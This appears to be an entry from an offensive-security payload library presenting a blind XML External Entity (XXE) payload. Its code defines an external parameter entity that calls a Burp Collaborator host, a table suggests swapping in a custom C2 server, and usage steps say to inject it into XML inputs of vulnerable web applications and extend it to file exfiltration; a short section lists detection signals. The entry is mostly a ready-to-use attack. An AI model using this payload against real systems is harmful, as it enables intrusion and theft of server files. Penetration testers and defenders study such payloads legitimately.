---
id: 8055eb01-78ad-49ff-83f8-c409e4932080
name: XML-External-Entity-for-Out-of-Band-Exfiltration
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.361398+00:00'
updated_at: '2023-04-10T20:24:38.784710+00:00'
platforms:
  - Web
tags:
  - xxe
  - oob
  - payload
validated: true
---

# XML-External-Entity-for-Out-of-Band-Exfiltration

## Code

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

## Description

This XML payload defines an external parameter entity (%ext) that references an attacker-controlled URL via HTTP. When processed by a vulnerable XML parser, it triggers an outbound request to the specified URL, enabling out-of-band interaction confirmation without returning data in-band. It is used in blind XXE attacks to test for vulnerability and set up exfiltration channels.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `UNIQUE_ID_FOR_BURP_COLLABORATOR` | Unique identifier for the Burp Collaborator instance | `abc123xyz` |
| `burpcollaborator.net` | Burp Collaborator domain (replace with custom C2 server if needed) | `burpcollaborator.net` |
| `/x` | Endpoint path on the server to receive the request | `/x` |

## Usage

Inject this payload into any XML input field of a vulnerable web application (e.g., via POST request body). Monitor the Collaborator for incoming requests to confirm XXE processing. Extend by combining with file entities for data exfiltration in procedures like [[procedures/Blind-XXE-Out-of-Band-Data-Exfiltration]].

## Detection

- XML parser logs showing DTD processing or external entity resolution.
- Network monitoring for outbound HTTP/DNS requests to unknown domains from the application server.
- WAF alerts on payloads containing '% ext' or external SYSTEM entities.

## Related

- [[procedures/Blind-XXE-Out-of-Band-Data-Exfiltration]]
